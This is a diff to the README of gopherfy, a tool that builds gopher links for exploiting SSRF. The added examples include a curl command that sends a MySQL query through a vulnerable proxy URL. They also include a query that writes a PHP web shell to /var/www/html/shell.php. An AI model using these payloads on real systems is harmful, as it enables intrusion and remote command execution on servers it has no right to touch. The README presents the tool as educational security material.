@@ -3,6 +3,10 @@
 [![Go Reference](https://pkg.go.dev/badge/github.com/hupe1980/gopherfy.svg)](https://pkg.go.dev/github.com/hupe1980/gopherfy)
 > Tool to generate gopher links for exploiting SSRF
 
+```
+curl http://example.org/ssrf/vuln/proxy?url=$(gopherfy mysql -e url -q "show databases;")
+```
+
 :warning: This is for educational purpose. Don’t try it on live servers!
 
 ## How to use
@@ -56,6 +60,9 @@ Generate mysql gopher link
 Usage:
   gopherfy mysql [flags]
 
+Examples:
+gopherfy mysql -q "SELECT '<?php system(\$$_REQUEST[\'cmd\']); ?>' INTO OUTFILE '/var/www/html/shell.php'"
+
 Flags:
   -a, --addr string    mysql address (default "127.0.0.1:3306")
   -d, --db string      mysql database name
@@ -86,5 +93,3 @@ Global Flags:
 ```
 ## License
 [MIT](LICENCE)
-
-'select "<?php system($_REQUEST[\'cmd\']); ?>" INTO OUTFILE "/var/www/html/shell.php"'
